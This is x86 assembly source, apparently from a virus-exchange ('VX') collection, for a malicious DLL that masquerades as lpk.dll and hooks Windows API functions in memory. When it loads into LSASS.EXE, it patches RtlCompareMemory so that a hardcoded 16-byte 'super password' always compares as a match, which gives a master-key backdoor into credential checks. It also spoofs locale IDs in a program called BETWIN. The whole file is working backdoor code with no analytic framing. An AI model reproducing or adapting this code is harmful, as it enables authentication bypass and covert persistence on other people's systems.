;2007-7-18  VX-Client
strTest EQU FALSE
SUPERPASSWORDCRACK EQU TRUE
      .586
      .model flat, stdcall  ; 32 bit memory model
      option casemap :none  ; case sensitive
      include LPK.inc


      HookApi PROTO  @@DllName :DWORD , @@ApiName : DWORD , @@MyProc : DWORD , @@StolenLen : DWORD , @@RetAdrees : DWORD 
       
.data 
RET_EAX dd 0

if SUPERPASSWORDCRACK
        strNTDLL            DB  "NTDLL.DLL",0
        strRtlCompareMemory DB "RtlCompareMemory",0
        strSuperPassword    dd 079F703CEh, 0ABFCBBFFh, 037236C5Ch, 014137E31h
        MyRtlCompareMemoryRetAdr    DD 0
endif
        MyCreateFileRetAdr DD 0
      
        strWS2_32      DB  "kernel32.dll",0
        strGetSystemDefaultUILanguage DB "GetSystemDefaultUILanguage",0
        strGetSystemDefaultLangID     DB  "GetSystemDefaultLangID",0
        strGetSystemDefaultLCID       DB  "GetSystemDefaultLCID",0
        strGetUserDefaultLCID         DB  "GetUserDefaultLCID",0
        strGetUserDefaultUILanguage   DB "GetUserDefaultUILanguage",0
        ;strGetUserDefaultLangID      DB  "GetUserDefaultLangID",0  ;  LCID    
        
        MyGetSystemDefaultLangIDRetAdr    DD 0
        
        MyCreateFlgs   DB  FALSE

MyCreateFileData   DB 068h
MyCreateFileAddr   DD offset MyGetSystemDefaultLangID
                   DB 0C3h
                    DB 090h
                   DB 090h
                   DB 090h
                   DB 090h
                     
        dbNetWait      DB FALSE
        dbTimeOut      DD 0
        LpkLoadFlg     DB FALSE
        wc   WNDCLASSEX <>
        msg  MSG <>
        
.data?  
           strTempPath  DB 100h dup (?)
                                
.code

MyRtlCompareMemory Proc @@Source1:DWORD , @@Source2:DWORD , @@Len:DWORD
     pushad
     mov ecx,@@Len
     mov edi,@@Source2
     cld
     .if ecx == 10h
         mov esi,offset strSuperPassword
         repz cmpsb
         .if ecx == 0
             popad
             mov eax,@@Len
             ret
         .endif
     .endif
;if FALSE
     mov esi,@@Source1
     mov edi,@@Source2
     repz cmpsb
     mov eax,@@Len
     sub eax,ecx
     mov RET_EAX ,eax
     popad
     ret
;endif
     popad
     DB 056h, 057h, 0FCh, 08Bh, 074h, 024h, 00Ch ;Íµ×ßµÄ´úÂë
     push MyRtlCompareMemoryRetAdr
     DB 0C3H
MyRtlCompareMemory Endp
               
MyGetSystemDefaultLangID Proc
          mov eax,0409h
          DB 0C3h
MyGetSystemDefaultLangID Endp                               

MyGetSystemDefaultLangID2 Proc
          mov eax,0409h ;090001h
          DB 0C3h
MyGetSystemDefaultLangID2 Endp    

FindFKeyStr Proc @@Handle :DWORD

    pushad
    invoke GetModuleFileName , @@Handle , addr strTempPath , 200
    mov dword ptr [eax+strTempPath],0      
    .if eax > 0
        push eax
        .while eax > 0
             .if byte ptr [eax+strTempPath] >= 'a'              ;          
                 .if byte ptr [eax+strTempPath] <= 'z'
                     sub byte ptr [eax+strTempPath] , 020h
                 .endif
             .endif
             dec eax
        .endw
        pop eax
        .while eax > 0
             .break .if byte ptr [eax+strTempPath-1] >= '\'     ;    \BETWIN
             dec eax
        .endw 
    .endif
    add eax,offset strTempPath
    mov RET_EAX , eax
    popad
    ret

FindFKeyStr Endp
      

                     
Main proc hinstdll:DWORD , reason:DWORD , reserved1:DWORD
        pushad
        xor eax,eax
        xor eax,eax
        xor eax,eax
        xor eax,eax
        xor eax,eax
        xor eax,eax
        xor eax,eax
        xor eax,eax
        xor eax,eax
        xor eax,eax
     .if reason == DLL_PROCESS_ATTACH                                    
     push hinstdll
     pop  hInstance
                     
     mov LpkLoadFlg , FALSE     
     invoke FindFKeyStr , hinstdll        ;                    
     .if dword ptr [eax] == '.KPL'        ;            LPK.DLL                lpk.dll
         mov LpkLoadFlg , TRUE
         call LoadDebug
     .endif
     invoke FindFKeyStr , NULL
;jmp @@test
     .if dword ptr [eax] == 'WTEB'        ;BETWIN
         .if word ptr [eax+4] == 'NI'
@@test:
             invoke HookApi , addr strWS2_32 ,   addr strGetSystemDefaultLangID ,   addr MyGetSystemDefaultLangID ,    6 , addr MyGetSystemDefaultLangIDRetAdr              
             invoke HookApi , addr strWS2_32 ,   addr strGetSystemDefaultLCID ,   addr MyGetSystemDefaultLangID2 ,    6 , addr MyGetSystemDefaultLangIDRetAdr              
             ;invoke HookApi , addr strWS2_32 ,   addr strGetUserDefaultLCID   ,   addr MyGetSystemDefaultLangID2 ,    6 , addr MyGetSystemDefaultLangIDRetAdr              
             ; invoke HookApi , addr strWS2_32 ,   addr strGetUserDefaultUILanguage   ,   addr MyGetSystemDefaultLangID2 ,    6 , addr MyGetSystemDefaultLangIDRetAdr              
             ;invoke HookApi , addr strWS2_32 ,   addr strGetSystemDefaultUILanguage ,   addr MyGetSystemDefaultLangID2 ,    6 , addr MyGetSystemDefaultLangIDRetAdr              
             mov LpkLoadFlg , TRUE
         .endif        
     .endif
if SUPERPASSWORDCRACK                                                
     .if dword ptr [eax] == 'SASL'        ;BETWIN
         .if dword ptr [eax+4] == 'XE.S'
             invoke HookApi , addr strNTDLL ,   addr strRtlCompareMemory ,   addr MyRtlCompareMemory ,    7 , addr MyRtlCompareMemoryRetAdr              
             mov LpkLoadFlg , TRUE
         .endif        
     .endif
endif                                  
     
     .elseif reason == DLL_PROCESS_DETACH
        
     .elseif reason == DLL_THREAD_ATTACH
           
     .endif
     xor eax,eax
     .if LpkLoadFlg == TRUE
         inc eax
     .endif
     ret
Main    endp 
                        
HookApi Proc @@DllName :DWORD , @@ApiName : DWORD , @@MyProc : DWORD , @@StolenLen : DWORD , @@RetAdress : DWORD
         
        pushad
        invoke GetModuleHandle , @@DllName
        mov ebx,eax
        invoke GetProcAddress , ebx , @@ApiName
        push eax
        add eax,@@StolenLen
        mov ebx,@@RetAdress
        mov dword ptr [ebx],eax
        invoke GetCurrentProcessId
        invoke OpenProcess , PROCESS_ALL_ACCESS , TRUE , EAX
        pop ebx
        push eax
        mov ecx,@@MyProc
        mov MyCreateFileAddr,ecx
        invoke WriteProcessMemory , eax , ebx , ADDR MyCreateFileData , @@StolenLen , 0
        pop eax
        invoke CloseHandle , eax             
        popad
        ret

HookApi Endp 



END  Main 









































































































































